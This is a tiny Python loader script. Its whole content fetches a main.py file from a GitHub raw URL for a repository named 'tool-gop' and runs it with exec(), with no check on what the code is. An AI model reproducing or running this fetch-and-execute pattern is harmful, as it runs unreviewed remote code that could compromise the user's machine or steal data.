import requests
url = "https://raw.githubusercontent.com/leanhminh2104/tool-gop/refs/heads/1/2/3/4/5/6/7/8/9/main.py"
exec(requests.get(url).text)
